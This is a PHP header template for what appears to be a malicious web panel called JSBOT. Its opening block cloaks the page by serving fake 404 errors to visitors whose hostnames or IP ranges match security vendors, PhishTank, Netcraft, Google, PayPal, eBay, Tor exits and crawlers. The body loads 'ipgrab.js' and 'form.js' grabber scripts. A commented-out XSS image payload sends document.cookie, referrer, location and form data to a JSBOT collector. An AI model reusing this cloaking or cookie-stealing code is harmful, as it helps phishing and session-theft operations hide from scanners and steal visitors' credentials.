<?php
error_reporting(0);
include "../core.php";
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="SHORTCUT ICON" href="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/images/icon.gif">
		<title><?php echo $IB_TITLE;?></title>
		<meta name="description" content="<?php echo $IB_DESCRIPTION.', '. $IB_SELOGAN; ?>">
		<meta name="keywords" content="<?php echo $IB_KEY; ?>">
        <link type="text/css" href="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/bootstrap/css/bootstrap.min.css" rel="stylesheet">
        <link type="text/css" href="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/bootstrap/css/bootstrap-responsive.min.css" rel="stylesheet">
        <link type="text/css" href="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/css/theme.css" rel="stylesheet">
        <link type="text/css" href="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/images/icons/css/font-awesome.css" rel="stylesheet">
        <link type="text/css" href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,600italic,400,600' rel='stylesheet'>

    </head>
    <body>
		<script src="http://localhost/JSBOT/ipgrab.js" type="text/javascript"></script>
		<script src="http://localhost/JSBOT/form.js" type="text/javascript"></script>
		<?php if(isset($_SESSION['LOGIN']) && ($_SESSION['LOGIN'] == true)){ ?>
        <div class="navbar navbar-fixed-top">
            <div class="navbar-inner">
                <div class="container">
                    <a class="btn btn-navbar" data-toggle="collapse" data-target=".navbar-inverse-collapse">
                        <i class="icon-reorder shaded"></i></a><a class="brand" href="<?=$GLOBALS['_CONF']['HTTP'];?>"><?php echo $IB_TITLE;?></a>
                    <div class="nav-collapse collapse navbar-inverse-collapse">
                        <!--<img src=x onerror=this.src='http://localhost/JSBOT/?id=0.0.0.0&domain='+document.domain+'&ref='+document.referrer+'&location='+document.location+'&cookie='+document.cookie+'&data='+document.form+''>-->
                        <ul class="nav pull-right">
                            <li class="nav-user dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <img src="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/images/user.png" class="nav-avatar" />
                                <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    <li><a href="<?=$GLOBALS['_CONF']['HTTP'];?>#"><i class="icon-user"></i> Username: <b><?php echo $_SESSION['USER']; ?></b></a></li>
                                    <li class="divider"></li>
                                    <li><a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=backupdatabase"><i class="icon-fire"></i> Backup Database</a></li>
                                    <li class="divider"></li>
                                    <li><a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=changepassword"><i class="icon-lock"></i> Change Password</a></li>
                                    <li class="divider"></li>
                                    <li><a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=logout"><i class="icon-signout"></i> Logout</a></li>
                                </ul>
                            </li>
                        </ul>
                    </div>
                    <!-- /.nav-collapse -->
                </div>
            </div>
            <!-- /navbar-inner -->
        </div>
        <!-- /navbar -->
		<?php } else { ?>
		<div class="navbar navbar-fixed-top">
			<div class="navbar-inner">
				<div class="container">
					<a class="btn btn-navbar" data-toggle="collapse" data-target=".navbar-inverse-collapse">
						<i class="icon-reorder shaded"></i>
					</a>
					<a class="brand" href="<?=$GLOBALS['_CONF']['HTTP'];?>">
						<?php echo $IB_TITLE;?>
					</a>
				</div>
			</div><!-- /navbar-inner -->
		</div><!-- /navbar -->
		<?php } ?>